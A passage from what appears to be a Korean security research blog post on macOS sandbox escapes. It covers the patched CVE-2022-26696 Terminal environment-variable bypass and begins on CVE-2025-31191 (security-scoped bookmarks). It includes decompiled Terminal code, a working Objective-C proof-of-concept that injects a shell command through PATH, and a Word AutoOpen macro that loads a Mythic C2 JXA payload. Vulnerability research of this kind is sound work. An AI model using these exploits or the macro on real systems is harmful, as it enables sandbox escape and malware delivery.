<code>isRunningInInstallEnvironment()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC124;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">+(char)isRunningInInstallEnvironment {    <span class="hljs-keyword">if</span> (*(int8_t *)byte_10010617c == 0x1) {        rax = *(int8_t *)byte_10010617b;    } <span class="hljs-keyword">else</span> {        COND = getenv(<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>) != 0x0;        rax = COND_BYTE_SET(NE);        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;        *(int8_t *)byte_10010617c = 0x1;    }    rax = sign_extend_64(rax);    <span class="hljs-built_in">return</span> rax;}</code></pre><p>&#xC774;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>__OSINSTALL_ENVIRONMENT</code>&#xB77C;&#xB294; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; Terminal&#xC740; <strong>BaseSystem &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB41C; &#xAC83;</strong>&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p><p><em>* macOS &#xC124;&#xCE58; USB&#xB97C; &#xBD80;&#xD305;&#xD588;&#xC744; &#xB54C;&#xC758; &#xC124;&#xCE58; UI, macOS &#xBCF5;&#xAD6C; &#xBAA8;&#xB4DC;(Recovery Mode), BaseSystem.dmg&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xD658;&#xACBD; &#xB4F1;</em></p><pre><code class="hljs bash">-(void *)init {    var_30 = self;    *(&amp;var_30 + 0x8) = *0x1000f4790;    rax = [[&amp;var_30 super] init];    r14 = rax;    <span class="hljs-keyword">if</span> (rax != 0x0) {        <span class="hljs-keyword">if</span> (*qword_100105e38 == 0x0) {            *qword_100105e38 = r14;        }        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];        <span class="hljs-keyword">if</span> ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {            [rbx removeObjectForKey:@<span class="hljs-string">&quot;HOME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;USER&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;LOGNAME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;PATH&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;SHELL&quot;</span>];        }</code></pre><p><code>init</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; <code>isRunningInInstallEnvironment()</code> &#xAC12;&#xC774; <code>NO</code>&#xC774;&#xBA74;, Terminal&#xC740; <code>HOME</code>, <code>PATH</code> &#xB4F1; &#xC8FC;&#xC694; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC9C0;&#xC6B0;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;. &#xADF8;&#xB7F0;&#xB370; &#xC774; &#xAC12;&#xC774; <code>YES</code>&#xC77C; &#xACBD;&#xC6B0;, &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB4E4;&#xC774; &#xC9C0;&#xC6CC;&#xC9C0;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xAD6D;, <code>__OSINSTALL_ENVIRONMENT=1</code> &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xD558;&#xB098;&#xB9CC; &#xC124;&#xC815;&#xD558;&#xBA74;, Terminal.app&#xC740; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC778;&#xB370;&#xC694;. &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD558;&#xBA74; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774; Terminal&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC258; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;</strong>&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD574;&#xC11C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC571; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ol><li><code>__OSINSTALL_ENVIRONMENT=1</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC640; &#xD568;&#xAED8; Terminal.app &#xC2E4;&#xD589;</li><li><code>PATH</code> &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xC5D0; &#xC545;&#xC131; &#xBA85;&#xB839;&#xC5B4; &#xC0BD;&#xC785; &#x2192; <code>$(malicious_command)</code> &#xD615;&#xD0DC;</li><li>Terminal&#xC774; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xBC1B;&#xC544; &#xC2E4;&#xD589; </li><li>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC571;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; </li></ol><pre><code class="hljs bash">void sbxWithShellCommand(NSString *<span class="hljs-built_in">command</span>) {    FSRef appFSURL;    NSString *path = @<span class="hljs-string">&quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&quot;</span>;    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;appFSURL, NULL);    <span class="hljs-keyword">if</span> (stat2 &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>,stat2);    }    LSApplicationParameters appParam;    appParam.version = 0;    appParam.flags = kLSLaunchDefaults;    appParam.application = &amp;appFSURL;    appParam.argv = NULL;    // &#xC2E4;&#xD589;&#xD560; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;    NSString *finalCommand = [NSString stringWithFormat:@<span class="hljs-string">&quot;<span class="hljs-subst">$(%@)</span>&quot;</span>, <span class="hljs-built_in">command</span>];    NSDictionary *envs = @{@<span class="hljs-string">&quot;PATH&quot;</span>:finalCommand, @<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>:@<span class="hljs-string">&quot;1&quot;</span>};    appParam.environment = (__bridge CFDictionaryRef)envs;    appParam.asyncLaunchRefCon = NULL;    appParam.initialEvent = NULL;    CFArrayRef array = (__bridge CFArrayRef)@[];    OSStatus <span class="hljs-built_in">stat</span> = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;appParam, NULL, 0);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stat</span> &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>, <span class="hljs-built_in">stat</span>);    }}</code></pre><p>Apple&#xC758; <a href="https://developer.apple.com/documentation/coreservices/launch_services"><strong>LaunchServices API</strong></a>&#xC778; <code>LSOpenURLsWithRole()</code>&#xC744; &#xC774;&#xC6A9;&#xD574; Terminal&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0;, &#xADF8;&#xB54C; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB85C; &#xC258; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB118;&#xAE30;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C;, &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Microsoft Word &#xB9E4;&#xD06C;&#xB85C; &#xC548;&#xC5D0;&#xC11C;&#xB3C4; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs bash">Sub AutoOpen()MacScript (<span class="hljs-string">&quot;do shell script &quot;</span><span class="hljs-string">&quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&apos;<span class="hljs-subst">$(/usr/bin/osascript -l JavaScript /path/.apfell.js)</span>&apos;&quot;</span><span class="hljs-string">&quot; &quot;</span>)End Sub</code></pre><p>Word &#xBB38;&#xC11C; &#xB0B4; &#xB9E4;&#xD06C;&#xB85C;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; <strong>Mythic C2&#xC758; JXA Payload</strong>&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>++ Apple&#xC740; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; CVE-2022-26696&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD574; Terminal&#xC774; <code>__OSINSTALL_ENVIRONMENT</code> &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xB354; &#xC774;&#xC0C1; &#xC2E0;&#xB8B0;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C; &#xD130;&#xBBF8;&#xB110;(v2.14)&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xAC01; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image5.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image6.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image7.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image8.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image9.png" alt="image.png"></p><p>&#xB2E8;&#xC21C;&#xD788; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xC218;&#xC900;&#xC774; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xB354; &#xB2E4;&#xC591;&#xD55C; &#xBCF4;&#xC548; &#xC870;&#xAC74;&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xACE0;, &#xB0B4;&#xBD80; &#xC0C1;&#xD0DC;&#xB3C4; &#xAD6C;&#xC870;&#xC801;&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;</strong>&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC5B4;&#xC694;. </p><p>&#xB2E8;&#xC21C;&#xD788; <code>__OSINSTALL_ENVIRONMENT</code> &#xC5D0; &#xC758;&#xC874;&#xD558;&#xB358; &#xAD6C;&#xC870;&#xB97C; &#xAC77;&#xC5B4;&#xB0B4;&#xACE0;, Terminal&#xC774; <strong>&#xC815;&#xC0C1;&#xC801;&#xC778; launchd &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xBCF4;&#xC548; &#xAE30;&#xBC18;&#xC744; &#xAC15;&#xD654;&#xD55C; &#xAC83;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD6C4;&#xB85C;&#xB3C4; Launch Services&#xAC00; <strong>XPC &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC0C1;&#xD0DC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.</strong></p><p>[TTApplication init] &#xCF54;&#xB4DC;</p><pre><code class="hljs bash">TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2){  TTApplication *v2; // rax  TTApplication *v3; // rbx  id v4; // rax  id v5; // rax  id v6; // r14  void *v7; // rax  id v8; // rax  id v9; // rax  id v10; // rax  id v11; // rax  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF  v13.receiver = self;  v13.cls = &amp;OBJC_CLASS___TTApplication;  v2 = (TTApplication *)objc_msgSendSuper2(&amp;v13, <span class="hljs-string">&quot;init&quot;</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 )                                     // rax  {    <span class="hljs-keyword">if</span> ( !qword_1000FFE38 )      qword_1000FFE38 = v2;    v4 = objc_msgSend(&amp;OBJC_CLASS___NSProcessInfo, <span class="hljs-string">&quot;processInfo&quot;</span>);    v5 = objc_msgSend(v4, <span class="hljs-string">&quot;environment&quot;</span>);    v6 = objc_msgSend(v5, <span class="hljs-string">&quot;mutableCopy&quot;</span>);    v7 = (void *)objc_opt_class(v3);    <span class="hljs-keyword">if</span> ( !(unsigned __int8)objc_msgSend(v7, <span class="hljs-string">&quot;isRunningInInstallEnvironment&quot;</span>) )    {      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFD90);// <span class="hljs-string">&quot;HOME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDB0);// <span class="hljs-string">&quot;USER&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDD0);// <span class="hljs-string">&quot;LOGNAME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDF0);// <span class="hljs-string">&quot;PATH&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE10);// <span class="hljs-string">&quot;SHELL&quot;</span>      <span class="hljs-keyword">if</span> ( (unsigned int)csr_check(2LL) )        objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE30);    }    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE50);    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE70);    v3-&gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, <span class="hljs-string">&quot;copy&quot;</span>);    objc_release(v6);    objc_msgSend(v3, <span class="hljs-string">&quot;setDelegate:&quot;</span>, v3);    v8 = objc_alloc(&amp;OBJC_CLASS___NSMutableIndexSet);    v3-&gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, <span class="hljs-string">&quot;initWithIndexesInRange:&quot;</span>, 1LL, 9LL);    v3-&gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;OBJC_CLASS___NSMutableDictionary);    v9 = objc_msgSend(&amp;OBJC_CLASS___NSUserDefaults, <span class="hljs-string">&quot;standardUserDefaults&quot;</span>);    v10 = objc_msgSend(v9, <span class="hljs-string">&quot;objectForKey:&quot;</span>, off_1000FF878);    <span class="hljs-keyword">if</span> ( v10 )      objc_msgSend(v3, <span class="hljs-string">&quot;setDefaultShell:&quot;</span>, v10);    objc_msgSend(v3, <span class="hljs-string">&quot;addObserver:forKeyPath:options:context:&quot;</span>, v3, &amp;off_1000CFE90, 11LL, &amp;unk_1000A4548);    v11 = objc_msgSend(&amp;OBJC_CLASS___NSNotificationCenter, <span class="hljs-string">&quot;defaultCenter&quot;</span>);    objc_msgSend(      v11,      <span class="hljs-string">&quot;addObserver:selector:name:object:&quot;</span>,      v3,      <span class="hljs-string">&quot;handleWindowKeyChange:&quot;</span>,      NSWindowDidBecomeKeyNotification,      0LL);    v3-&gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;OBJC_CLASS___TTWorkspace);    objc_msgSend(&amp;OBJC_CLASS___NSColor, <span class="hljs-string">&quot;setIgnoresAlpha:&quot;</span>, 0LL);    objc_msgSend(v3, <span class="hljs-string">&quot;initLowSwapSpaceWatcher&quot;</span>);  }  <span class="hljs-built_in">return</span> v3;}</code></pre><hr><h3 id="2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-&#xAE30;&#xBC18;-Sandbox-Escape"><a href="#2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-&#xAE30;&#xBC18;-Sandbox-Escape" class="headerlink" title="2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks &#xAE30;&#xBC18; Sandbox Escape"></a>2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks &#xAE30;&#xBC18; Sandbox Escape</h3><p>CVE&#x2011;2025&#x2011;31191&#xB294; macOS&#xC5D0;&#xC11C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774; <strong>Security&#x2011;Scoped Bookmark</strong>&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC2B9;&#xC778; &#xC5C6;&#xC774;&#xB3C4; &#xC2DC;&#xC2A4;&#xD15C; &#xC790;&#xC6D0;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD5C8;&#xC6A9;&#xD588;&#xB358; &#xAD6C;&#xC870;&#xC801; &#xD5C8;&#xC810;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>2.1&#xC5D0;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF8; CVE-2022-26696 &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; Launch Services &#xAE30;&#xBC18; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xB294;&#xB370;&#xC694;. &#xC774;&#xD6C4; Apple&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; Launch Services &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB3C4; App Sandbox &#xC815;&#xCC45;&#xC744; &#xAC15;&#xD654;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C;&#xB294; XPC &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC0C1;&#xD0DC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xACE0;, &#xC774;&#xB85C; &#xC778;&#xD574; <strong>CVE-2022-26706</strong>, <strong>CVE-2021-30864</strong>, <strong>CVE-2022-26696</strong> &#xAC19;&#xC740; &#xACFC;&#xAC70; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; &#xB354; &#xC774;&#xC0C1; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xC5C8;&#xC8E0;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xBCC0;&#xD654;&#xB294; Microsoft Office for macOS &#xD658;&#xACBD;&#xC5D0;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Office &#xC571; &#xC5ED;&#xC2DC; macOS&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC815;&#xCC45;&#xC744; &#xC5C4;&#xACA9;&#xD788; &#xB530;&#xB974;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xC608;&#xC804;&#xCC98;&#xB7FC; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC190;&#xC27D;&#xAC8C; &#xCD08;&#xAE30; &#xCE68;&#xD22C;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xAE30;&#xB294; &#xC5B4;&#xB824;&#xC6B4; &#xAD6C;&#xC870;&#xAC00; &#xB418;&#xC5C8;&#xC5B4;&#xC694;. &#xADF8;&#xB7EC;&#xB098;, &#xC704;&#xD611; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB0A8;&#xC544; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; <strong>&#xD30C;&#xC77C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xD1A0;&#xD070;&#xCC98;&#xB7FC; &#xC800;&#xC7A5;&#xD574; &#xB458; &#xC218; &#xC788;&#xB294; SSB(Security&#x2011;Scoped Bookmark)</strong> &#xAE30;&#xB2A5;&#xC744; &#xC8FC;&#xC694; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC0BC;&#xC544; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>Security&#x2011;Scoped Bookmark?</strong></p></blockquote><p>macOS&#xB294; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD574; &#xC571;&#xC758; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBA85;&#xC2DC;&#xC801;&#xC778; &#xC2B9;&#xC778;&#xC774; &#xC5C6;&#xC774;&#xB294; &#xC678;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xAE30;&#xB2A5; &#xC911; &#xD558;&#xB098;&#xAC00; &#xBC14;&#xB85C; <strong>Security&#x2011;Scoped Bookmark</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; Bookmark&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xC744; &#xC2B9;&#xC778;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC790;&#xC6D0;&#xC5D0; &#xB300;&#xD55C; <strong>&#xC811;&#xADFC; &#xAD8C;&#xD55C;</strong>&#xC744; &#xD1A0;&#xD070;&#xCC98;&#xB7FC; &#xC800;&#xC7A5;&#xD574; &#xB458; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC918;&#xC694;. &#xC571;&#xC740; &#xC774; Bookmark&#xB97C; &#xC800;&#xC7A5;&#xD574;&#xB450;&#xC5C8;&#xB2E4;&#xAC00; &#xB098;&#xC911;&#xC5D0; &#xB2E4;&#xC2DC; &#xC0AC;&#xC6A9;&#xD574;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790; &#xC2B9;&#xC778;&#xC744; &#xB2E4;&#xC2DC; &#xBC1B;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>macOS&#xC6A9; Office &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC704; &#xAE30;&#xB2A5;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; VBA API&#xAC00; &#xC0C8;&#xB86D;&#xAC8C; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>AppleScriptTask</strong></p><p>  &#xB9E4;&#xD06C;&#xB85C;&#xAC00; &#xBBF8;&#xB9AC; &#xC9C0;&#xC815;&#xB41C; AppleScript&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; API&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; <code>~/Library/Application Scripts/[&#xBC88;&#xB4E4; ID]/</code> &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD558;&#xBA70;, Office &#xC571; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC774; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; escape &#xC5D0;&#xB294; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>GrantAccessToMultipleFiles</strong></p><p>  &#xC774; API&#xB294; &#xB9E4;&#xD06C;&#xB85C; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC5EC;&#xB7EC; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD574; &#xC2B9;&#xC778;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD55C; &#xB4A4;, &#xADF8; &#xD30C;&#xC77C;&#xB4E4;&#xC5D0; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC5D0;&#xC11C;&#xB3C4; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xAE30;&#xB2A5;&#xC774;&#xC5D0;&#xC694;. &#xD2B9;&#xD788; &#xB300;&#xC6A9;&#xB7C9; &#xC791;&#xC5C5;&#xC5D0;&#xC11C; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC4F0;&#xC77C; &#xC218; &#xC788;&#xC8E0;.</p></li></ul><p>&#xC774; &#xC911; <code>AppleScriptTask</code>&#xB294; &#xBCF4;&#xC548;&#xC801;&#xC73C;&#xB85C; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC5B4; &#xBCF4;&#xC600;&#xAE30;&#xC5D0;, <code>GrantAccessToMultipleFiles</code> API&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBCF8;&#xACA9;&#xC801;&#xC778; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC5B4;&#xC694;.</p><blockquote><p><strong>SSB &#xC545;&#xC6A9;</strong></p></blockquote><p><code>GrantAccessToMultipleFiles</code> API&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xACE0; &#xC2B9;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2B9;&#xC778;&#xC774; &#xC7AC;&#xBD80;&#xD305; &#xD6C4;&#xC5D0;&#xB3C4; 